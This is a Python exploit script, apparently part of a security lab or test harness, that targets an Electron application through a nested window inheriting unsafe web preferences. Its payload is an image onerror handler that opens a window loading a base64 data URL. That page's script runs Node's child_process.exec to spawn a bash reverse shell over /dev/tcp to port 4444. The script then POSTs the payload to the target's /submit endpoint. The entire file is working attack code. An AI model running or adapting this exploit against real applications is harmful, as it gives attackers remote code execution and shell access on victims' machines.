#!/usr/bin/env python3
"""Exploit unsafe web preferences inherited by a nested Electron window."""

import base64
import html
import json
import os
import time
import urllib.request


def build_payload() -> str:
    command = "bash -c 'bash -i >& /dev/tcp/localhost/4444 0>&1'"
    script = "require('child_process').exec(" + json.dumps(command) + ")"
    page = f"<script>{script}</script>"
    data_url = "data:text/html;base64," + base64.b64encode(page.encode()).decode()
    handler = f"window.open().open('{data_url}')"
    return f'<img src=x onerror="{html.escape(handler, quote=True)}">'


def submit(target_url: str, payload: str) -> int:
    request = urllib.request.Request(
        target_url.rstrip("/") + "/submit",
        data=payload.encode(),
        method="POST",
        headers={"Content-Type": "text/html"},
    )
    with urllib.request.urlopen(request, timeout=20) as response:
        response.read()
        return response.status


def main() -> None:
    target_url = os.environ.get("REMOTE_TARGET_URL") or os.environ["LOCAL_TARGET_URL"]
    status = submit(target_url, build_payload())
    if status != 202:
        raise RuntimeError(f"Unexpected application response: {status}")
    time.sleep(4)
    print(json.dumps({"evidence_payload": {}, "request_status": status}))


if __name__ == "__main__":
    main()
